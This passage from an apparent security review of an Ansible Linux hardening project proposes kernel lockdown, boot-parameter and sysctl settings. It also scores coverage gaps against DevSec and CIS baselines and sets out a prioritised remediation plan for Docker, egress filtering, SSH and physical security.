# bootloader/defaults/main.yml
bootloader_kernel_lockdown_enabled: false
bootloader_kernel_lockdown_mode: "integrity"  # or "confidentiality"

# templates/grub.j2
{% if bootloader_kernel_lockdown_enabled %}
GRUB_CMDLINE_LINUX="${GRUB_CMDLINE_LINUX} lockdown={{ bootloader_kernel_lockdown_mode }}"
{% endif %}
```

**Sources:**
- [Kernel Lockdown - man7.org](https://man7.org/linux/man-pages/man7/kernel_lockdown.7.html)
- [Ubuntu: Kernel Protections](https://documentation.ubuntu.com/security/security-features/kernel-protections/)
- [Enable Kernel Lockdown Mode](https://github.com/Kicksecure/security-misc/issues/328)

#### ❌ MEDIUM: Kernel Boot Parameters

**Current Status:** **NOT IMPLEMENTED** (no `bootloader` role)

**Additional Hardening:**

Per Madaidan's Linux Hardening Guide and Obscurix:

| Parameter | Purpose | Trade-off |
|-----------|---------|-----------|
| `init_on_alloc=1` | Zero memory on allocation | ~5% performance hit |
| `init_on_free=1` | Zero memory on free | ~5% performance hit |
| `slab_nomerge` | Prevent slab merging (heap hardening) | Increased memory usage |
| `page_alloc.shuffle=1` | Randomize page allocator | Slight performance hit |
| `pti=on` | Page Table Isolation (Meltdown) | ~10% performance hit (already default) |
| `vsyscall=none` | Disable vsyscall (legacy, vulnerable) | Breaks ancient binaries |

**Recommendation:**
Add to `bootloader` role:
```yaml
# bootloader/defaults/main.yml
bootloader_kernel_params_hardening:
  - "init_on_alloc=1"
  - "init_on_free=1"
  - "slab_nomerge"
  - "page_alloc.shuffle=1"
  - "vsyscall=none"
```

**Sources:**
- [Linux Hardening Guide - Madaidan](https://madaidans-insecurities.github.io/guides/linux-hardening.html)
- [Obscurix - Kernel Hardening](https://obscurix.github.io/security/kernel-hardening.html)
- [Linux 6.17 Security Features](https://www.armosec.io/blog/linux-6-17-security-features/)

#### ❌ MEDIUM: Additional sysctl Parameters

**DevSec Baseline Additions:**

Per DevSec os_hardening role:

| Parameter | DevSec Value | Project | Missing? |
|-----------|--------------|---------|----------|
| `kernel.core_uses_pid` | `1` | ❌ | YES |
| `kernel.kexec_load_disabled` | `1` | ❌ | YES |
| `kernel.sysrq` | `0` | ❌ | YES |
| `kernel.unprivileged_bpf_disabled` | `1` | ❌ | YES |
| `kernel.perf_event_paranoid` | `3` | ❌ | YES |
| `fs.protected_fifos` | `1` | ❌ | YES |
| `fs.protected_regular` | `2` | ❌ | YES |
| `fs.suid_dumpable` | `0` | ❌ | YES |

**Recommendation:**
Add to `sysctl/defaults/main.yml`:
```yaml
sysctl_security_params_extended:
  kernel.core_uses_pid: 1              # Include PID in core dump names
  kernel.kexec_load_disabled: 1        # Disable kexec (prevents kernel restart bypass)
  kernel.sysrq: 0                      # Disable SysRq (prevents emergency access)
  kernel.unprivileged_bpf_disabled: 1  # Disable BPF for non-root (added in QW-2, verify!)
  kernel.perf_event_paranoid: 3        # Restrict perf (prevents side-channel attacks)
  fs.protected_fifos: 1                # Prevent FIFO exploits
  fs.protected_regular: 2              # Prevent regular file exploits
  fs.suid_dumpable: 0                  # No core dumps for SUID (added in QW-2, verify!)
```

**Note:**
Some parameters may already be in QW-2 (check `sysctl_security_params`).

**Sources:**
- [DevSec Linux Baseline sysctl](https://github.com/dev-sec/ansible-collection-hardening/blob/master/roles/os_hardening/defaults/main.yml)
- [Habr: FSTEC Kernel Hardening](https://habr.com/ru/articles/905368/)

### Kernel Hardening Coverage Summary

| Category | Implemented | Missing | DevSec Match |
|----------|-------------|---------|--------------|
| ASLR, kptr_restrict, dmesg | ✅ 100% | None | ✅ Match |
| Network hardening (IPv4) | ✅ 100% | IPv6 | ✅ Match |
| Filesystem protections | ✅ 100% | FIFOs, regular files | ⚠️ Partial |
| Module blacklisting | ❌ 0% | All | ❌ Missing |
| Module loading disable | ❌ 0% | All | ❌ Missing |
| Kernel lockdown | ❌ 0% | All | ❌ Missing |
| Boot parameters | ❌ 0% | All | ❌ Missing |
| Extended sysctl | ⚠️ 50% | 8 parameters | ⚠️ Partial |

**Overall Kernel Hardening Coverage:** ~60% (sysctl only)

### Recommendations with Priority

#### CRITICAL (Prevent Rootkits)

1. **Blacklist unused kernel modules** - Add to `sysctl` or new `kernel_modules` role

2. **Implement kernel lockdown** - Add to `bootloader` role (requires Secure Boot)

#### HIGH (Production Hardening)

3. **Add kernel boot parameters** - `init_on_alloc`, `slab_nomerge`, etc.

4. **Add extended sysctl** - DevSec baseline (kexec, BPF, perf)

#### MEDIUM (Advanced Hardening)

5. **Document `kernel.modules_disabled`** - Optional for high-security environments

6. **IPv6 hardening** - If IPv6 enabled (currently disabled)

### Sources Summary

- [DevSec Linux Baseline](https://dev-sec.io/baselines/linux/)
- [DevSec os_hardening Role](https://github.com/dev-sec/ansible-collection-hardening/blob/master/roles/os_hardening/README.md)
- [Linux Hardening Guide - Madaidan](https://madaidans-insecurities.github.io/guides/linux-hardening.html)
- [Obscurix: Kernel Hardening](https://obscurix.github.io/security/kernel-hardening.html)
- [Kernel Lockdown - man7.org](https://man7.org/linux/man-pages/man7/kernel_lockdown.7.html)
- [Ubuntu: Kernel Protections](https://documentation.ubuntu.com/security/security-features/kernel-protections/)
- [Increase Kernel Integrity - Linux Audit](https://linux-audit.com/kernel/increase-kernel-integrity-with-disabled-linux-kernel-modules-loading/)
- [Linux 6.17 Security Features](https://www.armosec.io/blog/linux-6-17-security-features/)
- [Habr: FSTEC Linux Hardening (Russian)](https://habr.com/ru/articles/905368/)

---

## Final Recommendations: Prioritized Action Plan

### CRITICAL (Block Production Use - Fix Immediately)

| # | Gap | Affected Files | Severity | Effort |
|---|-----|----------------|----------|--------|
| 1 | Docker `userns-remap` disabled | `docker/defaults/main.yml` | **CRITICAL** | 1 hour |
| 2 | Docker `icc` enabled (all containers communicate) | `docker/defaults/main.yml` | **CRITICAL** | 1 hour |
| 3 | Docker `no-new-privileges` disabled | `docker/defaults/main.yml` | **CRITICAL** | 30 min |
| 4 | No egress filtering (all outbound allowed) | `firewall/templates/nftables.conf.j2` | **CRITICAL** | 4 hours |
| 5 | `/etc/shadow` permissions not enforced | `base_system/tasks/` | **CRITICAL** | 1 hour |
| 6 | `/dev/shm` missing `noexec,nosuid,nodev` | `base_system/tasks/fstab.yml` | **CRITICAL** | 2 hours |
| 7 | No bootloader password | **NEW ROLE** `bootloader` | **CRITICAL** | 4 hours |
| 8 | AUR packages unverified | `yay/tasks/main.yml` | **CRITICAL** | 2 hours (warnings) |
| 9 | Verify vault-pass.sh NOT in git | `.gitignore`, git log | **CRITICAL** | 30 min |

**Total Effort:** ~16 hours (2 days)

### HIGH (Production Hardening - Within 30 Days)

| # | Gap | Action | Severity | Effort |
|---|-----|--------|----------|--------|
| 10 | Separate `/tmp` with `noexec` | Document in install guide | **HIGH** | 2 hours (doc) |
| 11 | SUID/SGID audit | NEW `system_maintenance` role | **HIGH** | 8 hours |
| 12 | SSH HostKeyAlgorithms not in template | `ssh/templates/sshd_config.j2` | **HIGH** | 1 hour |
| 13 | SSH LogLevel not VERBOSE | `ssh/defaults/main.yml` | **HIGH** | 30 min |
| 14 | Docker resource limits | `docker/templates/daemon.json.j2` | **HIGH** | 2 hours |
| 15 | Kernel module blacklisting | **NEW ROLE** `kernel_modules` | **HIGH** | 4 hours |
| 16 | USBGuard missing | **NEW ROLE** `usbguard` (Phase 9) | **HIGH** | 8 hours |

**Total Effort:** ~26 hours (3 days)

### MEDIUM (Compliance & Operational - Within 90 Days)

| # | Gap | Action | Severity | Effort |
|---|-----|--------|----------|--------|
| 17 | LUKS encryption missing | Document pre-install setup | **MEDIUM** | 4 hours (doc) |
| 18 | Legal banner for SSH | `ssh/defaults/main.yml` | **MEDIUM** | 1 hour |
| 19 | Egress logging | `firewall/templates/nftables.conf.j2` | **MEDIUM** | 2 hours |
| 20 | Extended sysctl (DevSec) | `sysctl/defaults/main.yml` | **MEDIUM** | 2 hours |
| 21 | Kernel boot parameters | `bootloader/templates/grub.j2` | **MEDIUM** | 2 hours |
| 22 | Ansible Galaxy signature verification | `ansible.cfg` | **MEDIUM** | 1 hour |

**Total Effort:** ~12 hours (1.5 days)

### LOW (Nice to Have - Future)

| # | Gap | Action | Severity | Effort |
|---|-----|--------|----------|--------|
| 23 | Post-quantum SSH KEX | `ssh/defaults/main.yml` | **LOW** | 30 min |
| 24 | Kernel lockdown mode | `bootloader/defaults/main.yml` | **LOW** | 2 hours |
| 25 | Docker image signing (Sigstore) | **NEW ROLE** `container_security` | **LOW** | 16 hours |
| 26 | HashiCorp Vault integration | `vault-pass.sh` rewrite | **LOW** | 8 hours |
| 27 | kernel.modules_disabled | Document optional feature | **LOW** | 1 hour (doc) |

**Total Effort:** ~28 hours (3.5 days)

---

## Summary: Security Gaps by Category

| Category | Coverage | Critical Gaps | Status |
|----------|----------|---------------|--------|
| **CIS Benchmark** | 45% | Filesystem, bootloader, file permissions | ❌ INCOMPLETE |
| **OWASP Docker** | 30% | userns-remap, ICC, resource limits | ❌ WEAK |
| **SSH Hardening** | 85% | HostKeyAlgorithms, LogLevel, Banner | ⚠️ GOOD |
| **Egress Filtering** | 0% | All outbound traffic allowed | ❌ MISSING |
| **Supply Chain** | 40% | AUR verification, image signing | ⚠️ PARTIAL |
| **Secrets Management** | 30% | Vault password location unknown | ⚠️ UNKNOWN |
| **Physical Security** | 5% | LUKS, USBGuard, bootloader | ❌ MISSING |
| **Kernel Hardening** | 60% | Module restrictions, lockdown, boot params | ⚠️ PARTIAL |

**Overall Security Posture:** ~40% (weighted average)

**Risk Assessment:**
- **Production Use:** ❌ NOT RECOMMENDED (critical gaps in Docker, egress, physical)
- **Development Workstation:** ⚠️ ACCEPTABLE (with awareness of risks)
- **Isolated Environment:** ✅ GOOD (strong network hardening, SSH crypto)

---

## Key Takeaways

### Strengths

1. ✅ **Excellent SSH crypto hardening** (Mozilla Modern tier, QW-1)
2. ✅ **Strong sysctl network security** (CIS 3.x: 95% coverage)
3. ✅ **Good access control** (PAM faillock, sudo hardening, AllowGroups)
4. ✅ **Proactive SSH rate limiting** (QW-4: prevents bruteforce)

### Critical Weaknesses

1. ❌ **Docker is insecure by default** (userns disabled, ICC enabled, no-new-privileges disabled)
2. ❌ **No egress filtering** (C2 callbacks and data exfiltration possible)
3. ❌ **Physical security absent** (no LUKS, no bootloader password, no USBGuard)
4. ❌ **Supply chain risks** (AUR unverified, Docker images unsigned)

### Strategic Recommendations

#### For Immediate Production Use

1. **Enable QW-3 Docker hardening** with fixes:
   - `userns-remap: default` + fix volume permissions
   - `icc: false` + document network impact
   - `no-new-privileges: true`

2. **Implement egress filtering** (Option B: DNS restrictions minimum)

3. **Complete `bootloader` role** (GRUB password protection)

#### For Long-Term Hardening

4. **Add missing CIS controls** (filesystem partitions, file permissions audit)

5. **Implement physical security stack** (LUKS pre-install guide, USBGuard role)

6. **Complete kernel hardening** (module blacklisting, boot parameters)

#### For Compliance

7. **Document trade-offs** (userns-remap volume issues, egress filtering exceptions)

8. **Add legal banners** (SSH, login, MOTD)

9. **Implement audit logging** (missing from all roles)

---

**END OF SECURITY DEEP DIVE REVIEW**
